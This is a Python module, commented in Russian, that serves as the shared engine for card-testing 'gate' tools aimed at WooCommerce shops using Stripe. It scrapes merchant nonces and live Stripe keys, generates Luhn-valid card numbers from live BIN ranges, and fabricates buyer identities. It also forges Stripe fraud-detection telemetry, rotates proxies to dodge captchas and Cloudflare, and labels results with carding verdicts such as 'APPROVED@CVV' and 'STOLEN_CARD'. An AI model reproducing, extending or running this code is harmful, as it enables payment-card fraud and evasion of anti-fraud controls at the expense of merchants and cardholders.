# language: Python 3.12+, file: gate_client.py, target: Windows 11, deps: curl_cffi
# Shared WooCommerce/Stripe gate engine — single source of truth for setup_gate.py,
# advanced_gate_scanner.py и scratch-диагностики. Любая правка верстки WooCommerce
# чинится ЗДЕСЬ один раз.
import asyncio
import os
import random
import re
import string
import uuid

STRIPE_API_VERSION = "2024-06-20"
STRIPE_JS_BUILD = "c1fbe29896"

# --- Regex'ы: единственный источник ---
RE_REG_NONCE = re.compile(r'woocommerce-register-nonce["\']?\s*value=["\']([a-f0-9]{10})["\']')
RE_PK_LIVE = re.compile(r'pk_live_[0-9a-zA-Z]{24,}')
RE_UPE_NONCE = re.compile(r'createAndConfirmSetupIntentNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']')
RE_LEGACY_NONCE = re.compile(r'add_card_nonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})["\']')
RE_LEGACY_NONCE_ALT = re.compile(r'createSetupIntentNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']')
RE_REGISTER_FORM = re.compile(r'<form[^>]*class="[^"]*register[^"]*"[^>]*>(.*?)</form>', re.S)
RE_HIDDEN_INPUT = re.compile(r'<input[^>]*type=["\']hidden["\'][^>]*>')
RE_INPUT_NAME = re.compile(r'name=["\']([^"\']+)["\']')
RE_INPUT_VALUE = re.compile(r'value=["\']([^"\']*)["\']')

CF_CHALLENGE_MARKS = (
    "Just a moment...",
    "Attention Required! | Cloudflare",
    "challenge-platform",
    "cf-turnstile-wrapper",
)

# --- Identity pools: без фиксированного паттерна alex.*@gmail ---
FIRST_NAMES = [
    "James", "Robert", "John", "Michael", "David", "William", "Richard", "Joseph",
    "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark", "Steven", "Paul",
    "Andrew", "Joshua", "Kenneth", "Kevin", "Brian", "George", "Edward", "Ronald",
]
LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
    "Rodriguez", "Martinez", "Anderson", "Taylor", "Thomas", "Moore", "Jackson",
    "Martin", "Lee", "Clark", "Lewis", "Walker", "Hall", "Young", "King", "Wright",
]
EMAIL_DOMAINS = [
    "gmail.com", "outlook.com", "yahoo.com", "hotmail.com", "icloud.com",
    "proton.me", "aol.com", "zoho.com",
]
# city/state/zip выровнены по индексу — реальная гео-связка
_CITIES = ["New York", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "Austin"]
_STATES = ["NY", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "TX"]
_ZIPS = ["10001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "73301"]

# BIN-пулы пробников: живые диапазоны MC/VISA, 16 цифр
_PROBE_BINS = ["517546", "558874", "542251", "453927", "491767", "448528", "530672", "455951"]


def rand_str(k: int = 8, chars: str = string.ascii_lowercase + string.digits) -> str:
    return "".join(random.choices(chars, k=k))


def check_luhn(card_num: str) -> bool:
    digits = [int(d) for d in card_num if d.isdigit()]
    checksum = 0
    for i, d in enumerate(reversed(digits)):
        if i % 2 == 1:
            doubled = d * 2
            checksum += doubled - 9 if doubled > 9 else doubled
        else:
            checksum += d
    return checksum % 10 == 0


def luhn_check_digit(partial: str) -> int:
    """Контрольная цифра, доводящая partial до Luhn-валидного номера."""
    digits = [int(d) for d in partial if d.isdigit()]
    checksum = 0
    # справа налево, позиции с учётом будущей контрольной цифры
    for i, d in enumerate(reversed(digits)):
        if i % 2 == 0:
            doubled = d * 2
            checksum += doubled - 9 if doubled > 9 else doubled
        else:
            checksum += d
    return (10 - checksum % 10) % 10


def gen_probe_card(bin_prefix: str | None = None) -> dict:
    """Случайный Luhn-валидный пробник вместо одного захаркоженного PAN."""
    prefix = bin_prefix if bin_prefix else random.choice(_PROBE_BINS)
    body = "".join(random.choices(string.digits, k=15 - len(prefix)))
    partial = prefix + body
    return {
        "number": partial + str(luhn_check_digit(partial)),
        "mm": f"{random.randint(1, 12):02d}",
        "yy": str(random.randint(1, 4) + 2026),
        "cvc": f"{random.randint(0, 999):03d}",
    }


def parse_card(raw: str) -> dict:
    parts = raw.strip().split("|")
    number = parts[0].strip()
    mm = parts[1].strip().zfill(2)
    yy = parts[2].strip()
    yy = "20" + yy[-2:] if len(yy) <= 2 else yy
    cvc_raw = parts[3].strip() if len(parts) > 3 else ""
    # Пустой CVC → случайная генерация: даёт шанс честного incorrect_cvс-вердикта
    # вместо гарантированного отказа на "000"
    cvc = cvc_raw if cvc_raw else f"{random.randint(0, 999):03d}"
    return {"number": number, "month": mm, "year": yy, "cvc": cvc, "raw": raw.strip()}


def mask_pan(raw: str) -> str:
    num = raw.split("|")[0].strip()
    return f"{num[:6]}******{num[-4:]}" if len(num) >= 10 else num


# --- Прокси-слой: пул data/proxies.txt + ротация ---

PROXIES_FILE = os.path.join("data", "proxies.txt")


def load_proxies(path: str = PROXIES_FILE) -> list[str]:
    """Строки формата scheme://user:pass@host:port или host:port (по умолчанию http)."""
    proxies = []
    if os.path.exists(path):
        with open(path, encoding="utf-8") as f:
            for line in f:
                p = line.strip()
                if not p or p.startswith("#"):
                    continue
                if "://" not in p:
                    p = "http://" + p
                proxies.append(p)
    return proxies


def pick_proxy(pool: list[str] | None, explicit: str | None) -> str | None:
    """Явный --proxy приоритетнее; иначе случайный из пула. Схема нормализуется всегда."""
    def norm(p: str) -> str:
        return p if "://" in p else "http://" + p
    if explicit:
        return norm(explicit)
    if pool:
        return norm(random.choice(pool))
    return None


# --- Сетевая гигиена: детект капчи + экспоненциальный backoff ---

CAPTCHA_MARKS = (
    "anomaly",
    "captcha",
    "unusual traffic",
    "prove you're human",
    "are you a robot",
)


def looks_like_captcha(html: str) -> bool:
    low = (html or "").lower()
    return any(mark in low for mark in CAPTCHA_MARKS)


async def backoff_sleep(attempt: int, base: float = 2.0, jitter: float = 0.5):
    """Экспоненциальная пауза: attempt 0 → base, дальше ×2 с джиттером."""
    delay = base * (2 ** attempt) + random.uniform(0, jitter)
    await asyncio.sleep(delay)


def polite_delay(base: float = 1.2, spread: float = 1.3):
    """Обычная вежливая пауза между запросами — рандомизированная."""
    return asyncio.sleep(random.uniform(base, base + spread))


def random_identity() -> dict:
    idx = random.randrange(len(_CITIES))
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    return {
        "first_name": first,
        "last_name": last,
        "name": f"{first} {last}",
        "email": f"{first.lower()}.{rand_str(7)}@{random.choice(EMAIL_DOMAINS)}",
        "username": f"{first.lower()}_{rand_str(6)}",
        "password": f"S{rand_str(10)}!{random.randint(2, 9)}aA",
        "line1": f"{random.randint(100, 9999)} {random.choice(['Main', 'Oak', 'Maple', 'Cedar', 'Park', 'Lake'])} Street",
        "city": _CITIES[idx],
        "state": _STATES[idx],
        "postal_code": _ZIPS[idx],
        "country": "US",
    }


def is_cloudflare_challenge(html: str) -> bool:
    return any(mark in html for mark in CF_CHALLENGE_MARKS)


def extract_reg_nonce(html: str) -> str | None:
    m = RE_REG_NONCE.search(html)
    return m.group(1) if m else None


def extract_pk_live(html: str) -> str:
    m = RE_PK_LIVE.findall(html)
    return m[0] if m else ""


def extract_honeypot_fields(form_html: str, body: dict) -> dict:
    """Возвращает body, дополненный hidden-полями формы регистрации (анти-спам токены)."""
    for inp in RE_HIDDEN_INPUT.findall(form_html):
        nm = RE_INPUT_NAME.search(inp)
        vl = RE_INPUT_VALUE.search(inp)
        if nm and vl and nm.group(1) not in body:
            body[nm.group(1)] = vl.group(1)
    return body


def extract_register_form_html(page_html: str) -> str:
    m = RE_REGISTER_FORM.search(page_html)
    return m.group(1) if m else page_html


def scrape_gate(pm_html: str) -> dict:
    """pk_live + оба варианта SetupIntent nonce со страницы add-payment-method."""
    pk = extract_pk_live(pm_html)
    upe_m = RE_UPE_NONCE.search(pm_html)
    legacy_m = RE_LEGACY_NONCE.search(pm_html)
    legacy = legacy_m.group(1) if legacy_m else ""
    if not legacy:
        alt_m = RE_LEGACY_NONCE_ALT.search(pm_html)
        if alt_m:
            legacy = alt_m.group(1)
    return {
        "pk": pk,
        "upe_nonce": upe_m.group(1) if upe_m else "",
        "legacy_nonce": legacy,
    }


def stripe_telemetry(base_url: str, pk: str) -> dict:
    """Radar Telemetry v2021 — payment-element, deferred-intent, полный набор attribution."""
    idx = random.randrange(len(_CITIES))
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    return {
        "muid": str(uuid.uuid4()),
        "sid": str(uuid.uuid4()),
        "guid": str(uuid.uuid4()),
        "time_on_page": str(random.randint(18400, 48900)),
        "name": f"{first} {last}",
        "line1": f"{random.randint(100, 9999)} {random.choice(['Main', 'Oak', 'Maple', 'Cedar'])} Street",
        "city": _CITIES[idx],
        "state": _STATES[idx],
        "postal_code": _ZIPS[idx],
        "country": "US",
        "client_session_id": f"src_{rand_str(24)}",
        "elements_session_config_id": f"src_{rand_str(24)}",
        "payment_user_agent": f"stripe.js/{STRIPE_JS_BUILD}; stripe-js-v3/{STRIPE_JS_BUILD}; payment-element; deferred-intent",
        "key": pk,
        "_stripe_version": STRIPE_API_VERSION,
    }


def tokenize_body(card: dict, telem: dict, referrer: str) -> dict:
    return {
        "type": "card",
        "billing_details[name]": telem["name"],
        "billing_details[address][line1]": telem["line1"],
        "billing_details[address][city]": telem["city"],
        "billing_details[address][state]": telem["state"],
        "billing_details[address][postal_code]": telem["postal_code"],
        "billing_details[address][country]": telem["country"],
        "card[number]": card["number"],
        "card[cvc]": card["cvc"],
        "card[exp_month]": card["month"],
        "card[exp_year]": card["year"],
        "allow_redisplay": "unspecified",
        "guid": telem["guid"],
        "muid": telem["muid"],
        "sid": telem["sid"],
        "pasted_fields": "number,cvc",
        "payment_user_agent": telem["payment_user_agent"],
        "referrer": referrer,
        "time_on_page": telem["time_on_page"],
        "client_attribution_metadata[client_session_id]": telem["client_session_id"],
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
        "client_attribution_metadata[merchant_integration_version]": "2021",
        "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
        "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
        "client_attribution_metadata[elements_session_config_id]": telem["elements_session_config_id"],
        "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
        "key": telem["key"],
        "_stripe_version": telem["_stripe_version"],
    }


TOKENIZE_HEADERS = {
    "Origin": "https://js.stripe.com",
    "Referer": "https://js.stripe.com/",
    "Accept": "application/json",
}


def ajax_headers_for(origin: str, referer: str) -> dict:
    return {
        "Origin": origin,
        "Referer": referer,
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json",
    }


def classify_verdict(err_msg: str) -> str:
    raw_err = (err_msg or "").lower()
    if "insufficient_funds" in raw_err or "insufficient funds" in raw_err:
        return "APPROVED@CVV"
    if "incorrect_cvc" in raw_err or "security code is incorrect" in raw_err or "invalid cvc" in raw_err:
        return "APPROVED@CCN"
    if "expired" in raw_err:
        return "EXPIRED"
    if "stolen" in raw_err or "lost" in raw_err:
        return "STOLEN_CARD"
    if "fraud" in raw_err or "risk" in raw_err:
        return "FLAGGED_RADAR"
    return "DECLINED"


def is_nonce_rejection(conf_resp: dict) -> bool:
    """WP отвечает data:'-1'/0 или 'nonce' в сообщении, когда ajax-nonce протух."""
    data = conf_resp.get("data")
    if isinstance(data, str) and data.strip() in ("-1", "0"):
        return True
    msg = ""
    if isinstance(data, dict):
        msg = str(data.get("error", {}).get("message", "")) + str(data.get("message", ""))
    msg += str(conf_resp.get("message", ""))
    return "nonce" in msg.lower()
